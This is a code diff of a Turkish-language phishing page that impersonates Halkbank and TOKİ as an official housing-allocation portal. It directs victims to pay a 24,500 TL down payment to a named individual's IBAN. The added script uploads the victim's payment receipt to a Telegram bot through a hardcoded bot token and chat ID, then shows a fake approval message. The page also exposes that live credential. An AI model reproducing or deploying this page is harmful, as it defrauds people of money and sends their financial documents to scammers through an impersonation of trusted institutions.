@@ -6,65 +6,93 @@
     <title>HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</title>
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f7f9; margin: 0; padding: 0; }
-        .navbar { background-color: #004a99; color: white; padding: 18px; text-align: center; font-size: 16px; font-weight: bold; line-height: 1.4; border-bottom: 3px solid #003366; }
-        .sub-header { background-color: #c9302c; color: white; text-align: center; padding: 10px; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
-        .container { max-width: 480px; margin: 20px auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); border: 1px solid #ddd; }
-        .status-box { background-color: #fff3cd; color: #856404; padding: 15px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 20px; border: 1px solid #ffeeba; border-left: 5px solid #ffc107; font-size: 14px; }
-        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; font-size: 14px; }
-        .payment-section { background: #fdfdfd; border: 2px dashed #004a99; padding: 20px; border-radius: 10px; margin-top: 20px; position: relative; }
-        .iban-box { background: #fff; border: 1px solid #ddd; padding: 15px; border-radius: 8px; margin: 15px 0; }
-        .label { font-size: 11px; color: #888; text-transform: uppercase; display: block; margin-bottom: 5px; }
-        .value-name { font-size: 22px; color: #222; font-weight: 900; display: block; margin-bottom: 12px; letter-spacing: 0.5px; }
-        .value-iban { font-size: 17px; color: #c9302c; font-family: 'Courier New', monospace; font-weight: bold; word-break: break-all; background: #f9f9f9; padding: 5px; border-radius: 4px; display: block; margin-bottom: 10px; }
-        .tahsis-no { background: #004a99; color: white; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-family: monospace; font-size: 18px; }
-        .price-tag { font-size: 26px; color: #004a99; font-weight: 900; display: block; margin-top: 10px; }
-        .warning-footer { color: #c9302c; font-size: 14px; font-weight: 900; text-align: center; margin-top: 15px; padding: 12px; border: 2px solid #c9302c; border-radius: 5px; background: #fff5f5; }
-        button { width: 100%; background-color: #004a99; color: white; padding: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 17px; margin-top: 20px; transition: 0.2s; }
-        .footer-text { font-size: 10px; color: #aaa; text-align: center; margin-top: 25px; line-height: 1.5; }
+        .navbar { background-color: #004a99; color: white; padding: 18px; text-align: center; font-size: 16px; font-weight: bold; border-bottom: 3px solid #003366; }
+        .container { max-width: 480px; margin: 20px auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); }
+        .status-box { background-color: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 20px; border-left: 5px solid #ffc107; font-size: 13px; }
+        .payment-section { background: #fdfdfd; border: 2px dashed #004a99; padding: 15px; border-radius: 10px; }
+        .iban-box { background: #fff; border: 1px solid #ddd; padding: 15px; border-radius: 8px; margin: 10px 0; }
+        .value-name { font-size: 20px; color: #222; font-weight: 900; display: block; }
+        .value-iban { font-size: 16px; color: #c9302c; font-family: monospace; font-weight: bold; word-break: break-all; }
+        .upload-section { margin-top: 20px; padding: 15px; background: #eef2f7; border-radius: 8px; text-align: center; border: 1px solid #d1d9e6; }
+        .upload-section label { display: block; font-weight: bold; color: #004a99; margin-bottom: 10px; font-size: 14px; }
+        #sendBtn { width: 100%; background-color: #28a745; color: white; padding: 18px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 17px; margin-top: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .loading { display: none; color: #004a99; font-weight: bold; margin-top: 15px; text-align: center; }
+        .warning-footer { color: #c9302c; font-size: 13px; font-weight: bold; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="navbar">HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</div>
-    <div class="sub-header">RESMİ KONUT TAHSİS VE PEŞİNAT ÖDEME PORTALI</div>
-
     <div class="container">
-        <div class="status-box">DİKKAT: TAHSİS İŞLEMLERİNİN TAMAMLANMASI İÇİN PEŞİNAT ÖDEMESİ GERÇEKLEŞTİRİNİZ!</div>
+        <div class="status-box">DİKKAT: TAHSİS İŞLEMİ İÇİN 24.500 TL PEŞİNAT DEKONTUNU SİSTEME YÜKLEYİNİZ!</div>
         
-        <div class="info-row"><span>Başvuru Durumu:</span> <b style="color:#d9534f;">ÖDEME BEKLENİYOR</b></div>
-        <div class="info-row"><span>Konut Tahsis No:</span> <b class="tahsis-no">TK-8842710</b></div>
-        <div class="info-row"><span>Tescil İşlemi:</span> <b>Tapu Tahsis Beklemede</b></div>
-
         <div class="payment-section">
-            <h4 style="margin:0 0 10px 0; color:#004a99; text-align:center;">GÜVENCELİ TAHSİLAT BİLGİLERİ</h4>
-            <p style="font-size:12px; color:#555; text-align:center; margin-bottom:15px;">Aşağıdaki yetkili tahsilat hesabına peşinat yatırılmadığı sürece hak sahipliği onaylanmayacaktır.</p>
-            
+            <span style="font-size:11px; color:#666;">Halkbank Kurumsal Tahsilat Yetkilisi:</span>
             <div class="iban-box">
-                <span class="label">Tahsilat Birimi Yetkilisi:</span>
-                <span class="value-name">İSMAİL ARSLAN</span>
-                
-                <span class="label">Resmi Halkbank IBAN Hesabı:</span>
+                <b class="value-name">İSMAİL ARSLAN</b>
                 <span class="value-iban">TR31 0006 7010 0000 0048 8523 29</span>
-                
-                <hr style="border:0; border-top:1px solid #eee; margin:15px 0;">
-                
-                <span class="label">Yatırılacak Kesin Peşinat Bedeli:</span>
-                <span class="price-tag">24.500,00 TL</span>
             </div>
-            
-            <div class="warning-footer">
-                ⚠️ AÇIKLAMA KISMINA SADECE <br>
-                <span style="font-size:18px;">TK-8842710</span> <br>
-                YAZINIZ!
+
+            <div class="upload-section">
+                <label>📄 ÖDEME DEKONTUNU YÜKLE</label>
+                <input type="file" id="dekontFile" accept="image/*,application/pdf">
+                <p style="font-size:10px; color:#666; margin-top:5px;">Tahsis No: <b>TK-8842710</b> (Dekontla eşleşmelidir)</p>
             </div>
+            <div class="warning-footer">⚠️ AÇIKLAMA KISMINA TK-8842710 YAZILMALIDIR!</div>
         </div>
 
-        <button onclick="alert('Ödemeniz sistem havuzuna düştükten sonra e-Devlet onayınız verilecektir. Lütfen dekontu saklayınız.')">ÖDEMEYİ YAPTIM, ONAYLA</button>
-        
-        <div class="footer-text">
-            Bu portal Halkbank Emlak Konut ve TOKİ Finansman Dairesi işbirliği ile hazırlanmıştır. <br>
-            Tahsilat Yetkilisi: İSMAİL ARSLAN | İşlem Kodu: TK-8842710 <br>
-            © 2026 Tüm Hakları Saklıdır.
+        <button id="sendBtn" onclick="paylas()">DEKONTU ONAYLA VE TAPU AL</button>
+        <div id="loader" class="loading">Sistem Doğrulanıyor, Lütfen Bekleyin...</div>
+
+        <div id="successMsg" style="display:none; text-align:center; color:#28a745; font-weight:bold; margin-top:20px; border: 2px solid #28a745; padding: 15px; border-radius: 10px;">
+            ✅ ÖDEME BİLDİRİMİ ALINDI! <br><br> 
+            <span style="color:#555; font-size:13px;">Dekontunuz manuel incelemeye alınmıştır. 15-30 dakika içerisinde e-Devlet onayınız verilecektir.</span>
         </div>
     </div>
+
+    <script>
+        async function paylas() {
+            const fileInput = document.getElementById('dekontFile');
+            const btn = document.getElementById('sendBtn');
+            const loader = document.getElementById('loader');
+            const successMsg = document.getElementById('successMsg');
+
+            if (fileInput.files.length === 0) {
+                alert("Lütfen önce ödeme dekontunuzu seçiniz!");
+                return;
+            }
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            const token = "7691262077:AAHym69rRlI7HRtkokgdlgkzJQb1gpTx4yU";
+            const chatId = "7432859148";
+            const file = fileInput.files[0];
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", file);
+            formData.append("caption", "🚨 BİNGO! YENİ DEKONT GELDİ\n\n💰 Tutar: 24.500 TL\n👤 Yetkili: İSMAİL ARSLAN\n📂 Tahsis No: TK-8842710\n\nParayı kontrol et patron!");
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                if (res.ok) {
+                    loader.style.display = 'none';
+                    successMsg.style.display = 'block';
+                } else {
+                    alert("Sistem meşgul, lütfen az sonra tekrar yükleyiniz.");
+                    btn.style.display = 'block';
+                    loader.style.display = 'none';
+                }
+            } catch (err) {
+                alert("Bağlantı hatası! İnternetinizi kontrol edip tekrar deneyiniz.");
+                btn.style.display = 'block';
+                loader.style.display = 'none';
+            }
+        }
+    </script>
 </body>
 </html>
